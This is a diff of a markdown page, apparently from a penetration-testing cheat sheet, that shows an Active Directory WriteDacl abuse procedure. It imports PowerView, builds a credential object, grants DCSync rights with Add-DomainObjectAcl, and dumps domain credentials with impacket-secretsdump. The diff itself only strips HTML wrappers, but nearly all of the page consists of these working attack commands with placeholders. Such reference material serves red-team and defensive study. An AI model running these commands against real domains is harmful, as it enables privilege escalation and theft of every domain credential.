@@ -9,19 +9,13 @@ tags: ["WriteDacl", "active driectory", "ad", "Windows", "dcsync", "secretsdump"
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Import PowerView.ps1 
-
-<div>
+#### 1. Import PowerView
 
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -35,17 +29,11 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
 #### 3. Add dcsync right
-
-<div>
 
 ```console
 Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -54,14 +42,8 @@ Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_
 {{< tab set2 tab1 active >}}Linux{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-<div>
-
 ```console
 impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
